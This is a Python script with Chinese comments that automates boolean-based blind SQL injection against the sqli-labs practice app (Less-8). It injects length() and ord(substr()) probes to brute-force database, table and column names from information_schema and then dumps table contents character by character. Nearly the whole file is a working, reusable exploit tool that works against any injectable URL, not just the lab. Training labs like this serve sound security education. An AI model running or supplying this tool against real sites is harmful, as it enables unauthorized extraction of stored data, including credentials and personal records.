# 1. 设置全局变量DIS 和list用于控制详细信息的显示以及定义需要爆破的ASCII码
# 2. 爆破当前数据库长度
# 3. 定义数据库长度爆破函数Brute_length()
# 4. 爆破当前数据库名称
# 5. 定义数据库名爆破函数Brute_database()
# 6. 爆破所有数据库长度
# 7. 爆破所有数据库名称
# 8. 爆破表名
# 9. 定义表名爆破函数Brute_table()
# 10. 爆破字段名
# 11. 定义字段爆破函数Brute_column()
# 12. 爆破数据
# 13. 定义数据爆破函数data_dump()

import requests
import time
import sys

# 1. 设置全局变量DIS 和list用于控制详细信息的显示以及定义需要爆破的ASCII码
DIS = True
list = [44, 46, 95, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58]
for i in range(97, 123):
    list.append(i)
for i in range(64, 91):
    list.append(i)
for i in range(33, 76):
    list.append(i)

def sql_Inject(url, flag, display):
    global DIS
    DIS = display

    # 2. 爆破当前数据库长度
    current_length = Brute_length(url, flag, current=True)
    print("当前数据库长度:", current_length)

    # 4. 爆破当前数据库名称
    current_database_name = Brute_database(url, current_length, flag, current=True)
    print("当前数据库名称:", current_database_name)

    # 6. 爆破所有数据库长度
    length = Brute_length(url, flag)
    print("数据库全长:", length)

    # 7. 爆破所有数据库名称
    all_databases = input("Brute all the databases?[yes/no]: ")
    if all_databases == 'yes':
        database_name = Brute_database(url, length, flag)
        print("数据库名称:", database_name)

    # 8. 爆破表名
    while True:
        choose_database = input("choose the database: ")
        table_name = Brute_table(url, choose_database, flag)
        print("数据库: %s" % choose_database)
        print("表: %s" % table_name)
        print('')
        next = input("continue brute the tables?[yes/no]: ")
        if next == "no":
            break

    # 10. 爆破字段名
    while True:
        choose_database = input("choose the database: ")
        choose_table = input("choose the table: ")
        column_name = Brute_column(url, choose_database, choose_table, flag)
        print("表: %s.%s" % (choose_database, choose_table))
        print("字段: %s" % column_name)
        print('')
        next = input("continue brute the columns?[yes/no]: ")
        if next == "no":
            break

    # 12. 爆破数据
    while True:
        choose_database = input("choose the database: ")
        choose_table = input("choose the table: ")
        choose_column = input("choose the column: ")
        data = data_dump(url, choose_database, choose_table, choose_column, flag)
        print("字段: %s.%s.%s" % (choose_database, choose_table, choose_column))
        print("数据: %s" % data)
        print('')
        next = input("continue dump the data?[yes/no]: ")
        if next == "no":
            break


# 13. 定义数据爆破函数data_dump()
def data_dump(url, database, table, column, flag):
    raw_url = url
    length = 1
    jump = 10
    data = ""

    # 首先判断数据长度
    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(id) from security.emails))>10 --+
        url = raw_url + "' and length((select group_concat(%s) from %s.%s))>%d --+" % (column, database, table, jump)
        response = requests.get(url)
        if DIS:
            print(url)
        if flag in response.content:
            jump += 10
        else:
            jump -= 10
            break

    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(id) from security.emails))>11 --+
        url = raw_url + "' and length((select group_concat(%s) from %s.%s))>%d --+" % (column, database, table, jump + length)
        if DIS:
            print(url)
        response = requests.get(url)
        if flag in response.content:
            length += 1
        else:
            break
    data_length = length + jump

    # 爆破数据
    for i in range(data_length):
        for ASCII in list:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and ord(substr((select group_concat(id) from security.emails),1,1))='44'--+
            url = raw_url + "' and ord(substr((select group_concat(%s) from %s.%s),%d,1))=%d --+" % (column, database, table, i + 1, ASCII)
            if DIS:
                print(url)
            response = requests.get(url)
            if flag in response.content:
                data += chr(ASCII)
                break
        # time.sleep(5)
    return data


# 11. 定义字段爆破函数Brute_column()
def Brute_column(url, database, table, flag):
    raw_url = url
    length = 1
    jump = 10
    column_name = ""

    # 首先判断字段长度
    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails'))>10 --+
        url = raw_url + "' and length((select group_concat(column_name) from information_schema.columns where table_schema='%s' and table_name='%s'))>%d --+" % (database, table, jump)
        response = requests.get(url)
        if DIS:
            print(url)
        if flag in response.content:
            jump += 10
        else:
            jump -= 10
            break

    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema="security"))>11 --+
        url = raw_url + "' and length((select group_concat(column_name) from information_schema.columns where table_schema='%s' and table_name='%s'))>%d --+" % (database, table, jump + length)
        if DIS:
            print(url)
        response = requests.get(url)
        if flag in response.content:
            length += 1
        else:
            break
    column_length = length + jump

    # 爆破字段名
    for i in range(column_length):
        for ASCII in list:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and ord(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='emails'),1,1))='44'--+
            url = raw_url + "' and ord(substr((select group_concat(column_name) from information_schema.columns where table_schema='%s' and table_name='%s'),%d,1))=%d --+" % (database, table, i + 1, ASCII)
            if DIS:
                print(url)
            response = requests.get(url)
            if flag in response.content:
                column_name += chr(ASCII)
                break
        # time.sleep(5)
    return column_name


# 9. 定义表名爆破函数Brute_table()
def Brute_table(url, database, flag):
    raw_url = url
    length = 1
    jump = 10
    table_name = ""

    # 首先判断表名长度
    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema="security"))>10 --+
        url = raw_url + "' and length((select group_concat(table_name) from information_schema.tables where table_schema='%s'))>%d --+" % (database, jump)
        response = requests.get(url)
        if DIS:
            print(url)
        if flag in response.content:
            jump += 10
        else:
            jump -= 10
            break

    while True:
        # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(table_name) from information_schema.tables where table_schema="security"))>11 --+
        url = raw_url + "' and length((select group_concat(table_name) from information_schema.tables where table_schema='%s'))>%d --+" % (database, jump + length)
        if DIS:
            print(url)
        response = requests.get(url)
        if flag in response.content:
            length += 1
        else:
            break
    table_length = length + jump

    # 爆破表名
    for i in range(table_length):
        for ASCII in list:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,1))='44'--+
            url = raw_url + "' and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema='%s'),%d,1))=%d --+" % (database, i + 1, ASCII)
            if DIS:
                print(url)
            response = requests.get(url)
            if flag in response.content:
                table_name += chr(ASCII)
                break
        # time.sleep(5)
    return table_name


# 5. 定义数据库名爆破函数Brute_database()
def Brute_database(url, length, flag, current=False):
    raw_url = url
    database_name = ""
    # 2. 爆破当前数据库名称
    if current:
        for i in range(length):
            for ASCII in range(97, 123):
                # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and ord(substr(database(),1,1))=97 --+
                url = raw_url + "' and ord(substr(database(),%d,1))=%d --+" % (i+1, ASCII)
                if DIS:
                    print(url)
                response = requests.get(url)
                if flag in response.content:
                    database_name += chr(ASCII)
                    break
            # time.sleep(5)
        return database_name

    # 爆破所有数据库名称
    # ' and ord(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=97--+
    else:
        for i in range(length):
            for ASCII in list:
                # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and ord(substr((select group_concat(schema_name) from information_schema.schemata),1,1))=44--+
                url = raw_url + "' and ord(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))=%d --+" % (i+1, ASCII)
                if DIS:
                    print(url)
                response = requests.get(url)
                if flag in response.content:
                    database_name += chr(ASCII)
                    break
            # time.sleep(5)
        return database_name


# 3. 定义数据库长度爆破函数Brute_length()
def Brute_length(url, flag, current=False):
    length = 1
    raw_url = url
    jump = 10
    # 判断是否爆破当前数据库
    if current:
        while True:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length(database())>1 --+
            url = raw_url + "' and length(database())>%d --+" % length
            if DIS:
                print(url)
            response = requests.get(url)
            if flag in response.content:
                length += 1
            else:
                break
        return length

    # 爆破所有数据库长度
    else:
        while True:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(schema_name) from information_schema.schemata))>10 --+
            url = raw_url + "' and length((select group_concat(schema_name) from information_schema.schemata))>%d --+" % jump
            response = requests.get(url)
            if DIS:
                print(url)
            if flag in response.content:
                jump += 10
            else:
                jump -= 10
                break

        while True:
            # url: http://192.168.1.105/sqli-labs-master/Less-8/?id=1' and length((select group_concat(schema_name) from information_schema.schemata))>1 --+
            url = raw_url + "' and length((select group_concat(schema_name) from information_schema.schemata))>%d --+" % (jump+length)
            if DIS:
                print(url)
            response = requests.get(url)
            if flag in response.content:
                length += 1
            else:
                break
        return (length+jump)


if __name__ == "__main__":
    url = "http://192.168.1.104/sqli-labs-master/Less-8/?id=1"
    flag = b'You are in...........'
    display = True
    sql_Inject(url, flag, display)
